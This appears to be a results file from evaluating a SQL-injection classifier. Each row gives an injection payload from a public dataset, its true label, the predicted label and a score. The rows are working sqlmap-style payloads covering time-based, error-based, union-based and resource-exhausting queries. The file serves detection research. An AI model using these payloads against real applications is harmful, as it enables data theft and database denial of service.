text,source,true_label,pred_label,score_sqli,correct
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'xaoi'  =  'xaoi",sajid576/sql-injection-dataset,1,1,0.9753928027385037,1
"-5062""   )    )     )   or   (  1069  =  8974  )  *8974 and    (    (     (  ""hsge""  =  ""hsge",sajid576/sql-injection-dataset,1,1,0.9953624859322264,1
"-7469  )   where 5875  =  5875 or make_set  (  9354  =  9354,7185  )  --",sajid576/sql-injection-dataset,1,1,0.9901791007665882,1
-6755  )   or 9323  =  9323#,sajid576/sql-injection-dataset,1,1,0.9462590358909093,1
"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'brlc'  =  'brlc",sajid576/sql-injection-dataset,1,1,0.9992021192996542,1
1  )   and 3659  =  5475 and   (  8949  =  8949,sajid576/sql-injection-dataset,1,1,0.9662524296593025,1
1'+  (  select aqhj where 4419  =  4419,sajid576/sql-injection-dataset,1,1,0.9774223299767705,1
"1""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""ynde""  =  ""ynde",sajid576/sql-injection-dataset,1,1,0.9988122403716232,1
"-5780 or make_set  (  3464  =  4518,4518  )  -- icit",sajid576/sql-injection-dataset,1,1,0.8927505340402784,1
"1""  )   where 4964  =  4964",sajid576/sql-injection-dataset,1,1,0.951807330875165,1
"1  )   union all select null,null,null,null,null#",sajid576/sql-injection-dataset,1,1,0.998711970660607,1
"-9764' where 1266  =  1266 or elt  (  4069  =  6162,6162  )  --",sajid576/sql-injection-dataset,1,1,0.9784034079226778,1
"1  )   union all select null,null--",sajid576/sql-injection-dataset,1,1,0.999992929030331,1
"1%""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""%""  =  """,sajid576/sql-injection-dataset,1,1,0.9996677901183714,1
"1%"" rlike sleep  (  5  )   and ""%""  =  """,sajid576/sql-injection-dataset,1,1,0.9928442641399133,1
(  select   (  case when   (  8130  =  5894  )   then 8130 else 8130*  (  select 8130 from information_schema.character_sets  )   end   )    ),sajid576/sql-injection-dataset,1,1,0.9787493683992381,1
"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",sajid576/sql-injection-dataset,1,1,0.6663767069434651,1
1'||  (  select 'uedk' where 4655  =  4655,sajid576/sql-injection-dataset,1,1,0.9786136459141968,1
"1%""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""%""  =  """,sajid576/sql-injection-dataset,1,1,0.9996704391392623,1
"-6890""   )    )     )   union all select 1115#",sajid576/sql-injection-dataset,1,1,0.999995211013377,1
"1'   )    )    as ewyk where 4828  =  4828 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sajid576/sql-injection-dataset,1,1,0.998077996951217,1
"-8186%' or elt  (  1032  =  1032,3623  )   and '%'  =  '",sajid576/sql-injection-dataset,1,1,0.9868263304240216,1
1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,sajid576/sql-injection-dataset,1,1,0.998253179903564,1
"1' in boolean mode  )   union all select null,null,null,null,null--",sajid576/sql-injection-dataset,1,1,0.9988411334295826,1
select   (  case when   (  7271  =  1658  )   then 7271 else 7271*  (  select 7271 from information_schema.character_sets  )   end  )  #,sajid576/sql-injection-dataset,1,1,0.9719006823316736,1
"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )",sajid576/sql-injection-dataset,1,1,0.9735494867493233,1
-4023 or   (  8779  =  5716  )  *5716,sajid576/sql-injection-dataset,1,1,0.8327050385391018,1
"-2009%' union all select 1991,1991#",sajid576/sql-injection-dataset,1,1,0.998454430591548,1
"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )",sajid576/sql-injection-dataset,1,1,0.9805328001078241,1
"1  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  7984  =  7984",sajid576/sql-injection-dataset,1,1,0.9985625790058988,1
"1   )    )    union all select null,null,null,null,null,null,null,null,null--",sajid576/sql-injection-dataset,1,1,0.9892253765798679,1
-8224'  )   where 6504  =  6504 or 2461  =  5660,sajid576/sql-injection-dataset,1,1,0.9765009205049889,1
end and 'huti' like 'huti,sajid576/sql-injection-dataset,1,1,0.7175297164070156,1
-8015  )   where 9808  =  9808 or 9323  =  9323#,sajid576/sql-injection-dataset,1,1,0.9832114195467885,1
"1'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'sdnc'  =  'sdnc",sajid576/sql-injection-dataset,1,1,0.9986948706321521,1
1   )    )    as goar where 2405  =  2405 and 5927  =  9731--,sajid576/sql-injection-dataset,1,1,0.9847323015602427,1
"1'+  (  select ounb where 4653  =  4653 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",sajid576/sql-injection-dataset,1,1,0.9989887155510867,1
1'   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'mmow'  =  'mmow,sajid576/sql-injection-dataset,1,1,0.995435850806033,1
-3378'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'otbq'  =  'otbq,sajid576/sql-injection-dataset,1,1,0.9991594579256793,1
"1"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and ""cxsu"" like ""cxsu",sajid576/sql-injection-dataset,1,1,0.9967174659673788,1
"1""  )   where 9570  =  9570 rlike   (  select   (  case when   (  1642  =  3686  )   then 1 else 0x28 end   )    )   --",sajid576/sql-injection-dataset,1,1,0.9998069161666131,1
"1'||  (  select 'epjr' from dual where 3074  =  3074 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",sajid576/sql-injection-dataset,1,1,0.9969281995915095,1
"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,sajid576/sql-injection-dataset,1,1,0.9921678391036328,1
1 where 6827  =  6827,sajid576/sql-injection-dataset,1,1,0.8780860130813893,1
"-5058%' union all select 6789,6789,6789,6789,6789#",sajid576/sql-injection-dataset,1,1,0.9157267076799016,1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""%""  =  """,sajid576/sql-injection-dataset,1,1,0.9787897534540455,1
1   )    )    and 7533  =  7533 and    (    (   8738  =  8738,sajid576/sql-injection-dataset,1,1,0.9940605767173158,1
"1""   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sajid576/sql-injection-dataset,1,1,0.9967679700740327,1
"1""  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""fbqy"" like ""fbqy",sajid576/sql-injection-dataset,1,1,0.990259133943792,1
1   )    )    as izvy where 2569  =  2569,sajid576/sql-injection-dataset,1,1,0.9833152728554225,1
"1%"" or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sajid576/sql-injection-dataset,1,1,0.995909158596148,1
"1'+  (  select 'aliz' where 5050  =  5050 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",sajid576/sql-injection-dataset,1,1,0.9937986878528744,1
"1%""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""%""  =  """,sajid576/sql-injection-dataset,1,1,0.9993648962493815,1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'xlvt'  =  'xlvt",sajid576/sql-injection-dataset,1,1,0.9699912284052459,1
1  )   as jvmv where 3857  =  3857 and   (  5717  =  6483  )  *6483--,sajid576/sql-injection-dataset,1,1,0.9816412237222614,1
select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,sajid576/sql-injection-dataset,1,1,0.9970874231393764,1
"1""  )   union all select null,null,null,null,null--",sajid576/sql-injection-dataset,1,1,0.9989968847552658,1
1 where 8180  =  8180 or sleep  (  5  )  #,sajid576/sql-injection-dataset,1,1,0.9898836864912726,1
1'||  (  select 'pmpd' where 9803  =  9803,sajid576/sql-injection-dataset,1,1,0.987644301304908,1
"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""ctrr""  =  ""ctrr",sajid576/sql-injection-dataset,1,1,0.9993128584378791,1
"-3347%"" or 9323  =  9323#",sajid576/sql-injection-dataset,1,1,0.9151210569434183,1
"1%"" and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",sajid576/sql-injection-dataset,1,1,0.9955040294829485,1
"1%'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  '%'  =  '",sajid576/sql-injection-dataset,1,1,0.9985060955340012,1
"(  select   (  case when   (  3531  =  3531  )   then   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 3531 end   )    )",sajid576/sql-injection-dataset,1,1,0.9938151873882191,1
1'  )   and   (  3020  =  3020  )  *6703 and   (  'rskq'  =  'rskq,sajid576/sql-injection-dataset,1,1,0.989253727811656,1
1'+  (  select qpaf where 7859  =  7859 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   +',sajid576/sql-injection-dataset,1,1,0.9992140745548302,1
"-6618""   )    )     )   order by 1#",sajid576/sql-injection-dataset,1,1,0.99413693580322,1
"-3628"" or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )",sajid576/sql-injection-dataset,1,1,0.989621869317549,1
1' where 5060  =  5060,sajid576/sql-injection-dataset,1,1,0.9125517256051451,1
"-9347'  )   union all select 3884,3884#",sajid576/sql-injection-dataset,1,1,0.999326264127245,1
"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )",sajid576/sql-injection-dataset,1,1,0.9995380766366665,1
-2625'   )    )    or 3038  =  3038,sajid576/sql-injection-dataset,1,1,0.9889686495231991,1
"1""   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""dwcy""  =  ""dwcy",sajid576/sql-injection-dataset,1,1,0.9997366857873218,1
"1'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",sajid576/sql-injection-dataset,1,1,0.9935947822500196,1
"-5819%""   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""%""  =  """,sajid576/sql-injection-dataset,1,1,0.9990539751333937,1
"-5539""  )   union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",sajid576/sql-injection-dataset,1,1,0.7197742665893894,1
"1'   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",sajid576/sql-injection-dataset,1,1,0.9981184177830674,1
"1""   )    )    and   (  7467  =  7962  )  *7962 and    (    (   ""nhld""  =  ""nhld",sajid576/sql-injection-dataset,1,1,0.9915305119015462,1
"1""  )   as lrew where 6067  =  6067 union all select null,null,null,null,null,null,null#",sajid576/sql-injection-dataset,1,1,0.9963591137548133,1
"1  )   as obhj where 1789  =  1789 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",sajid576/sql-injection-dataset,1,1,0.9963484047621627,1
"1'  )   as nvqk where 3917  =  3917 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,1,1,0.9962092277086697,1
"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )",sajid576/sql-injection-dataset,1,1,0.9869720221060202,1
"1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )",sajid576/sql-injection-dataset,1,1,0.9804225832569434,1
-1479%' or 5201  =  3398--,sajid576/sql-injection-dataset,1,1,0.8322237466480337,1
"1""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",sajid576/sql-injection-dataset,1,1,0.9932922652616075,1
1  )   waitfor delay '0:0:5'--,sajid576/sql-injection-dataset,1,1,0.9458406939224897,1
"1'   )    )    as peeo where 5356  =  5356 and elt  (  4722  =  2382,2382  )  --",sajid576/sql-injection-dataset,1,1,0.9908444297574897,1
"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""sdps""  =  ""sdps",sajid576/sql-injection-dataset,1,1,0.9997976636216973,1
"1'||  (  select 'ymac' from dual where 9268  =  9268 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  ||'",sajid576/sql-injection-dataset,1,1,0.9980781510358001,1
"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""tbdl"" like ""tbdl",sajid576/sql-injection-dataset,1,1,0.9998516819865345,1
"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'gtov' like 'gtov",sajid576/sql-injection-dataset,1,1,0.9974493690845649,1
-2951 or 4189  =  2291,sajid576/sql-injection-dataset,1,1,0.6337395696353012,1
"-1663' or elt  (  1032  =  1032,3623  )   and 'yqaj' like 'yqaj",sajid576/sql-injection-dataset,1,1,0.9675196195362565,1
-3578'   )    )     )   order by 1--,sajid576/sql-injection-dataset,1,1,0.9966345334092116,1
"1   )    )    as juoe where 9994  =  9994 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sajid576/sql-injection-dataset,1,1,0.9970877298547713,1
"1'||  (  select 'yaii' from dual where 7317  =  7317 union all select null,null,null,null,null,null,null,null,null#",sajid576/sql-injection-dataset,1,1,0.993446033576387,1
1'  )   where 4949  =  4949,sajid576/sql-injection-dataset,1,1,0.9797990382941479,1
"1""   )    )    as sqow where 8752  =  8752",sajid576/sql-injection-dataset,1,1,0.9863932075884084,1
"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )",sajid576/sql-injection-dataset,1,1,0.9969896894297227,1
"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",sajid576/sql-injection-dataset,1,0,0.47592057591039455,0
select   (  case when   (  3716  =  4021  )   then 3716 else 3716*  (  select 3716 from information_schema.character_sets  )   end  )  #,sajid576/sql-injection-dataset,1,1,0.9756236808660281,1
"1%'   )    )     )   union all select null,null,null,null,null,null,null--",sajid576/sql-injection-dataset,1,1,0.998259498444193,1
"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )",sajid576/sql-injection-dataset,1,1,0.9678333230356954,1
"1'  )   where 5883  =  5883 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sajid576/sql-injection-dataset,1,1,0.9911929057674792,1
"-2453""  )   union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520--",sajid576/sql-injection-dataset,1,1,0.6925052166944767,1
"1'   )    )    as lizu where 7691  =  7691 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sajid576/sql-injection-dataset,1,1,0.9989109324347119,1
1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,sajid576/sql-injection-dataset,1,1,0.9985357525251286,1
"1%""   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""%""  =  """,sajid576/sql-injection-dataset,1,1,0.9997598257215515,1
"1%"" union all select null,null,null,null,null,null--",sajid576/sql-injection-dataset,1,1,0.9919380176884928,1
end and   (  4610  =  4610,sajid576/sql-injection-dataset,1,1,0.9088691264687565,1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'kerg' like 'kerg,sajid576/sql-injection-dataset,1,1,0.9927738725483036,1
"1'||  (  select 'vqag' from dual where 8154  =  8154 union all select null,null,null,null,null,null,null,null,null,null--",sajid576/sql-injection-dataset,1,1,0.9909801018463453,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3",sajid576/sql-injection-dataset,1,1,0.8760513614275692,1
"-1830""   )    )    as bptv where 4805  =  4805 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",sajid576/sql-injection-dataset,1,1,0.9990019005609178,1
"-4047'||  (  select 'rqta' from dual where 9743  =  9743 union all select 9743,9743,9743#",sajid576/sql-injection-dataset,1,1,0.9938948567067258,1
1   )    )    as zoso where 3633  =  3633,sajid576/sql-injection-dataset,1,1,0.9713097644603416,1
"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )",sajid576/sql-injection-dataset,1,1,0.9956715708864489,1
"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",sajid576/sql-injection-dataset,1,1,0.9964696797558903,1
"1   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   9333  =  9333",sajid576/sql-injection-dataset,1,1,0.9981301395034101,1
"1' where 7464  =  7464 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",sajid576/sql-injection-dataset,1,1,0.9919284340141017,1
"1   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,1,1,0.992779548272134,1
"1  )   as yduh where 6481  =  6481 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sajid576/sql-injection-dataset,1,1,0.9961283317121679,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""ksip"" like ""ksip",sajid576/sql-injection-dataset,1,1,0.9925465364908364,1
"1%"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """,sajid576/sql-injection-dataset,1,1,0.999159482831586,1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual-- vykx",sajid576/sql-injection-dataset,1,1,0.9528391185009312,1
(  select   (  case when   (  7018  =  7018  )   then 7018 else 7018*  (  select 7018 from master..sysdatabases  )   end   )    ),sajid576/sql-injection-dataset,1,1,0.9416992872698681,1
"-4705' where 2029  =  2029 union all select 2029,2029,2029#",sajid576/sql-injection-dataset,1,1,0.9877756848971262,1
"1""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""dksc""  =  ""dksc",sajid576/sql-injection-dataset,1,1,0.9966320290446189,1
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'wytg'  =  'wytg",sajid576/sql-injection-dataset,1,1,0.997332902778165,1
"1%""  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sajid576/sql-injection-dataset,1,1,0.9901966304635889,1
"-9315'   )    )     )   union all select 5057,5057,5057,5057,5057#",sajid576/sql-injection-dataset,1,1,0.9844976960390388,1
1  )   where 8094  =  8094,sajid576/sql-injection-dataset,1,1,0.9544277420287384,1
-8684' where 9820  =  9820 or 6844  =  5105,sajid576/sql-injection-dataset,1,1,0.9335345723458763,1
"1%'   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sajid576/sql-injection-dataset,1,1,0.9993005422604172,1
select sleep  (  5   )    )   +',sajid576/sql-injection-dataset,1,1,0.9880476133450753,1
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'nqol'  =  'nqol,sajid576/sql-injection-dataset,1,1,0.9982428761435813,1
"-6772""   )    )    or 9323  =  9323#",sajid576/sql-injection-dataset,1,1,0.9792950750740791,1
"1"" and   (  7597  =  8422  )  *8422 and ""gywp"" like ""gywp",sajid576/sql-injection-dataset,1,1,0.918356609974219,1
1'   )    )     )   or sleep  (  5  )   and    (    (     (  'ecur'  =  'ecur,sajid576/sql-injection-dataset,1,1,0.9998295733930668,1
"1""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""dqis""  =  ""dqis",sajid576/sql-injection-dataset,1,1,0.9990373870860823,1
"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'obeh'  =  'obeh",sajid576/sql-injection-dataset,1,1,0.9975291793813541,1
"1'||  (  select 'lpej' from dual where 8294  =  8294 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",sajid576/sql-injection-dataset,1,1,0.999175062198705,1
"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )",sajid576/sql-injection-dataset,1,1,0.9841171468608731,1
"-5825  )   as mflf where 3999  =  3999 or make_set  (  1492  =  7153,7153  )  --",sajid576/sql-injection-dataset,1,1,0.9839910722952748,1
-5830'  )   as fivy where 2173  =  2173 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,sajid576/sql-injection-dataset,1,1,0.9920320069620101,1
1'||  (  select 'lzzr' where 2477  =  2477,sajid576/sql-injection-dataset,1,1,0.983204305534071,1
select   (  case when   (  3444  =  8424  )   then 3444 else 3444*  (  select 3444 from information_schema.character_sets  )   end  )  #,sajid576/sql-injection-dataset,1,1,0.9744408800864649,1
